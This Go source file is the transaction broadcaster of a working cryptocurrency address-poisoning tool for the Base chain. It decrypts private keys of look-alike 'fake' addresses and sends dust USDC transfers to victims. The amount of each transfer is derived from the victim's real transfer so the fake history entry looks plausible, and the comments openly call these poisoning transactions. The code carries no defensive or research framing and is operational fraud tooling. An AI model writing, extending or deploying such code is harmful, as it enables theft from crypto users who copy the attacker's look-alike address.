package executor

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/sha256"
	"errors"
	"fmt"
	"math/big"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"exploit/core"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/ethereum/go-ethereum/rpc"
	"go.uber.org/zap"
	"golang.org/x/crypto/pbkdf2"
)

const (
	broadcastTimeout = 5 * time.Second
	maxRetries       = 2
)

// BroadcasterConfig 广播器配置 (Base链)
type BroadcasterConfig struct {
	ChainID          int64        // 链ID (8453=Base主网, 84532=Base Sepolia)
	RPCUrls          []string     // RPC节点列表
	USDCContract     string       // USDC合约地址 (Base: 6位小数!)
	PoisonerContract string       // BatchPoisoner合约地址
	TransferGasLimit uint64       // Gas限制
	GasPriceGwei     float64      // Gas价格 (Gwei), Base L2极低 (备用)
	HTTPClient       *http.Client // 代理HTTP客户端 (可选)
}

type Broadcaster struct {
	config        BroadcasterConfig
	clients       []*ethclient.Client
	logger        *zap.Logger
	usdcAddr      common.Address // Base USDC (6位小数)
	chainID       *big.Int
	masterKey     []byte
	httpClient    *http.Client // 代理HTTP客户端
	mu            sync.Mutex
	nodeIndex     int
	cachedGasWei  atomic.Int64  // 缓存的 gas 价格 (wei)，已上浮 10%
	gasPriceReady chan struct{} // gas 价格就绪信号
	stopGasUpdate chan struct{} // 停止 gas 更新
}

// NewBroadcasterFromEnv 从环境变量创建广播器
func NewBroadcasterFromEnv(config BroadcasterConfig, logger *zap.Logger, masterKey []byte) (*Broadcaster, error) {
	clients := make([]*ethclient.Client, 0, len(config.RPCUrls))
	for _, url := range config.RPCUrls {
		url = strings.TrimSpace(url)
		if url == "" {
			continue
		}

		var client *ethclient.Client
		var err error

		if config.HTTPClient != nil {
			// 使用代理HTTP客户端
			rpcClient, rpcErr := rpc.DialHTTPWithClient(url, config.HTTPClient)
			if rpcErr != nil {
				logger.Warn("Failed to connect (proxy)", zap.String("url", url), zap.Error(rpcErr))
				continue
			}
			client = ethclient.NewClient(rpcClient)
		} else {
			// 直接连接
			client, err = ethclient.Dial(url)
			if err != nil {
				logger.Warn("Failed to connect", zap.String("url", url), zap.Error(err))
				continue
			}
		}
		clients = append(clients, client)
		logger.Info("✅ Broadcaster RPC连接成功", zap.String("url", url), zap.Bool("proxy", config.HTTPClient != nil))
	}
	if len(clients) == 0 {
		return nil, errors.New("no RPC nodes available")
	}

	b := &Broadcaster{
		config:        config,
		clients:       clients,
		logger:        logger,
		usdcAddr:      common.HexToAddress(config.USDCContract),
		chainID:       big.NewInt(config.ChainID),
		masterKey:     masterKey,
		httpClient:    config.HTTPClient,
		gasPriceReady: make(chan struct{}),
		stopGasUpdate: make(chan struct{}),
	}

	// 设置默认 gas 价格 (配置值 * 1.1)
	defaultGasWei := int64(config.GasPriceGwei * 1e9 * 1.1)
	b.cachedGasWei.Store(defaultGasWei)

	// 启动 WebSocket gas 价格更新
	go b.startGasPriceUpdater()

	logger.Info("✅ Broadcaster Base链配置",
		zap.String("USDC", b.usdcAddr.Hex()),
		zap.Int64("ChainID", config.ChainID))

	return b, nil
}

func (b *Broadcaster) getNextClient() *ethclient.Client {
	b.mu.Lock()
	defer b.mu.Unlock()
	client := b.clients[b.nodeIndex]
	b.nodeIndex = (b.nodeIndex + 1) % len(b.clients)
	return client
}

// startGasPriceUpdater 每 25 分钟从 RPC 获取一次 gas 价格
func (b *Broadcaster) startGasPriceUpdater() {
	// 立即获取一次
	b.updateGasPrice()
	close(b.gasPriceReady)

	// 每 25 分钟更新一次
	ticker := time.NewTicker(25 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-b.stopGasUpdate:
			b.logger.Info("🛑 停止 gas 价格更新")
			return
		case <-ticker.C:
			b.updateGasPrice()
		}
	}
}

// updateGasPrice 从 RPC 获取 gas 价格并缓存 (上浮 10%)，带重试
func (b *Broadcaster) updateGasPrice() {
	var gasPrice *big.Int
	var err error

	// 尝试所有节点
	for i := 0; i < len(b.clients); i++ {
		client := b.getNextClient()
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		gasPrice, err = client.SuggestGasPrice(ctx)
		cancel()

		if err == nil {
			break
		}
		b.logger.Debug("RPC 节点获取 gas 失败，尝试下一个", zap.Error(err))
	}

	if err != nil {
		b.logger.Warn("⚠️ 所有 RPC 节点获取 gas 价格失败，保持当前值", zap.Error(err))
		return
	}

	// 上浮 10%
	gasPriceWithBuffer := int64(float64(gasPrice.Int64()) * 1.1)

	// 最低 0.001 Gwei = 1000000 wei
	if gasPriceWithBuffer < 1000000 {
		gasPriceWithBuffer = 1000000
	}

	b.cachedGasWei.Store(gasPriceWithBuffer)
	b.logger.Info("✅ Gas 价格已更新",
		zap.Int64("原始Wei", gasPrice.Int64()),
		zap.Int64("缓存Wei", gasPriceWithBuffer),
		zap.Float64("缓存Gwei", float64(gasPriceWithBuffer)/1e9))
}

// GetCachedGasPrice 获取缓存的 gas 价格 (wei)
func (b *Broadcaster) GetCachedGasPrice() int64 {
	return b.cachedGasWei.Load()
}

// Stop 停止 gas 价格更新
func (b *Broadcaster) Stop() {
	close(b.stopGasUpdate)
}

func (b *Broadcaster) BroadcastTransfer(ctx context.Context, matched core.MatchedTarget) error {
	privateKey, err := b.decryptPrivateKey(matched.FakeAddress.EncryptedPrivateKey)
	if err != nil {
		b.logger.Error("解密私钥失败",
			zap.String("fake", matched.FakeAddress.Address[:10]+"..."),
			zap.Error(err))
		return err
	}
	defer zeroBytes(privateKey)

	// 构建交易前检查余额
	pk, _ := crypto.ToECDSA(privateKey)
	fromAddr := crypto.PubkeyToAddress(*pk.Public().(*ecdsa.PublicKey))

	client := b.getNextClient()

	// 检查ETH余额 (Base链)
	ethBalance, err := client.BalanceAt(ctx, fromAddr, nil)
	if err != nil {
		b.logger.Warn("获取ETH余额失败", zap.Error(err))
	} else {
		// 使用缓存的实时 gas 价格
		gasPriceWei := b.cachedGasWei.Load()
		// requiredGas = gasLimit * gasPrice (单位: wei)
		requiredGas := new(big.Int).Mul(
			big.NewInt(int64(b.config.TransferGasLimit)),
			big.NewInt(gasPriceWei),
		)
		if ethBalance.Cmp(requiredGas) < 0 {
			b.logger.Error("❌ 伪造地址ETH不足",
				zap.String("fake", fromAddr.Hex()[:10]+"..."),
				zap.String("余额", fmt.Sprintf("%.12f ETH", float64(ethBalance.Int64())/1e18)),
				zap.String("需要", fmt.Sprintf("%.12f ETH", float64(requiredGas.Int64())/1e18)))
			return errors.New("insufficient ETH for gas")
		}
		b.logger.Debug("💰 伪造地址余额检查通过",
			zap.String("fake", fromAddr.Hex()[:10]+"..."),
			zap.String("余额", fmt.Sprintf("%.12f ETH", float64(ethBalance.Int64())/1e18)))
	}

	// 投毒目标是 PoisonTo (发送方A)，而不是 Address (接收方B)
	poisonTo := matched.Target.PoisonTo
	if poisonTo == "" {
		poisonTo = matched.Target.From // 兼容旧逻辑
	}

	// 获取代币类型 (Base链只用USDC)
	tokenType := matched.Target.TokenType
	if tokenType == "" {
		tokenType = "USDT" // 默认USDT
	}

	// 使用原始转账金额计算智能投毒金额
	txHash, err := b.broadcastTx(ctx, privateKey, poisonTo, fromAddr, matched.Target.AmountUSD, tokenType)
	if err != nil {
		return err
	}
	_ = txHash // 忽略返回值
	return nil
}

// BroadcastTransferWithHash 广播转账并返回TxHash
// 逻辑: 从伪造地址发送代币给投毒目标 (发送方A)
func (b *Broadcaster) BroadcastTransferWithHash(ctx context.Context, matched core.MatchedTarget) (string, error) {
	privateKey, err := b.decryptPrivateKey(matched.FakeAddress.EncryptedPrivateKey)
	if err != nil {
		b.logger.Error("解密私钥失败",
			zap.String("fake", matched.FakeAddress.Address[:10]+"..."),
			zap.Error(err))
		return "", err
	}
	defer zeroBytes(privateKey)

	pk, _ := crypto.ToECDSA(privateKey)
	fromAddr := crypto.PubkeyToAddress(*pk.Public().(*ecdsa.PublicKey))

	// 验证：派生地址必须和存储地址一致
	storedAddr := strings.ToLower(matched.FakeAddress.Address)
	derivedAddr := strings.ToLower(fromAddr.Hex()[2:]) // 去掉0x前缀
	if storedAddr != derivedAddr {
		b.logger.Error("❌ 地址不匹配！私钥派生地址与存储地址不一致",
			zap.String("stored", storedAddr),
			zap.String("derived", derivedAddr))
		return "", fmt.Errorf("address mismatch: stored=%s derived=%s", storedAddr, derivedAddr)
	}

	// 投毒目标是 PoisonTo (发送方A)，而不是 Address (接收方B)
	poisonTo := matched.Target.PoisonTo
	if poisonTo == "" {
		poisonTo = matched.Target.From // 兼容旧逻辑
	}

	// 获取代币类型 (Base链只用USDC)
	tokenType := matched.Target.TokenType
	if tokenType == "" {
		tokenType = "USDT" // 默认USDT
	}

	// 使用原始转账金额计算智能投毒金额
	return b.broadcastTx(ctx, privateKey, poisonTo, fromAddr, matched.Target.AmountUSD, tokenType)
}

// broadcastTx 内部广播方法
func (b *Broadcaster) broadcastTx(ctx context.Context, privateKey []byte, toAddr string, fromAddr common.Address, originalAmountUSD float64, tokenType string) (string, error) {
	tx, err := b.buildTransferTx(ctx, privateKey, toAddr, originalAmountUSD, tokenType)
	if err != nil {
		b.logger.Error("构建交易失败",
			zap.String("fake", fromAddr.Hex()[:10]+"..."),
			zap.String("target", toAddr[:10]+"..."),
			zap.String("token", tokenType),
			zap.Error(err))
		return "", err
	}

	txHash := tx.Hash().Hex()[2:] // 去掉0x前缀
	fullTxHash := tx.Hash().Hex()

	for retry := 0; retry <= maxRetries; retry++ {
		client := b.getNextClient()
		ctxTimeout, cancel := context.WithTimeout(ctx, broadcastTimeout)
		err = client.SendTransaction(ctxTimeout, tx)
		cancel()

		if err == nil {
			// 发送成功，直接返回（不做 mempool 验证，避免 RPC 限速导致误判）
			b.logger.Info("✅ 投毒交易发送成功",
				zap.String("txHash", fullTxHash),
				zap.String("fake", fromAddr.Hex()),
				zap.String("target", toAddr),
				zap.String("token", tokenType),
				zap.Uint64("nonce", tx.Nonce()),
				zap.String("gasPrice", tx.GasPrice().String()))
			return txHash, nil
		}

		// 检查是否是"已知交易"错误 - 说明交易已发送成功
		errStr := err.Error()
		if strings.Contains(errStr, "already known") ||
			strings.Contains(errStr, "nonce too low") ||
			strings.Contains(errStr, "replacement transaction underpriced") {
			b.logger.Info("✅ 投毒交易已发送 (重复提交)",
				zap.String("txHash", fullTxHash),
				zap.String("fake", fromAddr.Hex()),
				zap.String("hint", errStr[:min(50, len(errStr))]))
			return txHash, nil
		}

		b.logger.Warn("广播失败，重试中",
			zap.Int("retry", retry),
			zap.String("fake", fromAddr.Hex()[:10]+"..."),
			zap.Error(err))
	}
	b.logger.Error("❌ 投毒交易最终失败",
		zap.String("fake", fromAddr.Hex()[:10]+"..."),
		zap.String("target", toAddr[:10]+"..."),
		zap.String("token", tokenType),
		zap.Error(err))
	return "", err
}

func (b *Broadcaster) buildTransferTx(ctx context.Context, pkBytes []byte, toAddr string, originalAmountUSD float64, tokenType string) (*types.Transaction, error) {
	privateKey, err := crypto.ToECDSA(pkBytes)
	if err != nil {
		return nil, err
	}
	publicKey := privateKey.Public()
	publicKeyECDSA, ok := publicKey.(*ecdsa.PublicKey)
	if !ok {
		return nil, errors.New("failed to get public key")
	}
	fromAddr := crypto.PubkeyToAddress(*publicKeyECDSA)

	// 获取nonce (带重试，轮询多个RPC节点)
	var nonce uint64
	var nonceErr error
	for retry := 0; retry < 3; retry++ {
		client := b.getNextClient()
		nonce, nonceErr = client.PendingNonceAt(ctx, fromAddr)
		if nonceErr == nil {
			break
		}
		if retry < 2 {
			time.Sleep(200 * time.Millisecond)
		}
	}
	if nonceErr != nil {
		return nil, fmt.Errorf("get nonce failed after 3 retries: %w", nonceErr)
	}

	// 使用缓存的实时 gas 价格 (已上浮 10%)
	gasPriceWei := b.cachedGasWei.Load()
	gasPrice := big.NewInt(gasPriceWei)

	// 智能投毒金额: 根据原始转账金额的前3位计算
	// Base链只有USDC, 且USDC是6位小数!
	poisonAmount := b.smartPoisonAmount(originalAmountUSD)

	// Base链只使用USDC
	contractAddr := b.usdcAddr

	to := common.HexToAddress(toAddr)
	data := buildTransferData(to, poisonAmount)
	tx := types.NewTransaction(nonce, contractAddr, big.NewInt(0), b.config.TransferGasLimit, gasPrice, data)
	signedTx, err := types.SignTx(tx, types.NewEIP155Signer(b.chainID), privateKey)
	if err != nil {
		return nil, err
	}
	return signedTx, nil
}

// smartPoisonAmount 根据原始转账金额计算智能投毒金额 (Base链: 只有USDC, 6位小数)
// 逻辑: 提取原始金额的前2位有效数字，作为投毒金额的小数部分
//
// Base USDC: 6位小数!
// 0.0000XX USDC = XX (最小单位)
// 例如:
//   - 1123 USDC → 前2位 11 → 投毒 0.000011 USDC = 11 最小单位
//   - 33.12 USDC → 前2位 33 → 投毒 0.000033 USDC = 33 最小单位
//   - 5 USDC → 前2位 50 → 投毒 0.000050 USDC = 50 最小单位
//   - 99.9 USDC → 前2位 99 → 投毒 0.000099 USDC = 99 最小单位
//
// 充值建议: 0.0001 USDC 即可覆盖所有情况 (最大99)
func (b *Broadcaster) smartPoisonAmount(originalAmountUSD float64) *big.Int {
	// 提取前2位有效数字 (自动规范化: 5→50, 0.89→89)
	first2Digits := extractFirst2Digits(originalAmountUSD)
	if first2Digits <= 0 {
		first2Digits = 10 // 默认值
	}

	// Base USDC: 6位小数
	// 0.0000XX USDC = XX 最小单位
	// 所以直接使用前2位数字作为最小单位数量，不需要乘以任何倍数
	// 最大: 99 最小单位 = 0.000099 USDC
	poisonAmount := big.NewInt(first2Digits)
	return poisonAmount
}

// extractFirst2Digits 提取数字的前2位有效数字
// 例如: 1123133 → 11, 33.1212 → 33, 5.5 → 55, 0.89 → 89
func extractFirst2Digits(value float64) int64 {
	if value <= 0 {
		return 10 // 默认值
	}

	// 将数值规范化到 [10, 100) 范围
	// 即找到 k 使得 10 <= value * 10^k < 100
	normalized := value
	for normalized >= 100 {
		normalized /= 10
	}
	for normalized < 10 {
		normalized *= 10
	}

	// 取整数部分
	result := int64(normalized)

	// 确保是2位数
	if result < 10 {
		result = 10
	}
	if result >= 100 {
		result = 99
	}

	return result
}

func buildTransferData(to common.Address, amount *big.Int) []byte {
	methodID := []byte{0xa9, 0x05, 0x9c, 0xbb}
	paddedTo := common.LeftPadBytes(to.Bytes(), 32)
	paddedAmount := common.LeftPadBytes(amount.Bytes(), 32)
	var data []byte
	data = append(data, methodID...)
	data = append(data, paddedTo...)
	data = append(data, paddedAmount...)
	return data
}

func (b *Broadcaster) decryptPrivateKey(encrypted []byte) ([]byte, error) {
	// Rust加密格式: nonce(12字节) + ciphertext(32字节+16字节tag) = 60字节
	if len(encrypted) != 60 {
		return nil, errors.New("invalid encrypted data length, expected 60 bytes")
	}

	// 使用与Rust相同的参数派生密钥
	// Rust: pbkdf2_hmac::<Sha256>(master_key, b"address-generator-salt", 10000, &mut derived_key)
	derivedKey := pbkdf2.Key(b.masterKey, []byte("address-generator-salt"), 10000, 32, sha256.New)

	// 提取nonce和ciphertext
	nonce := encrypted[:12]
	ciphertext := encrypted[12:] // 包含32字节私钥 + 16字节认证tag

	// AES-256-GCM解密
	block, err := aes.NewCipher(derivedKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

func zeroBytes(b []byte) {
	for i := range b {
		b[i] = 0
	}
}

func (b *Broadcaster) Close() {
	for _, client := range b.clients {
		client.Close()
	}
}
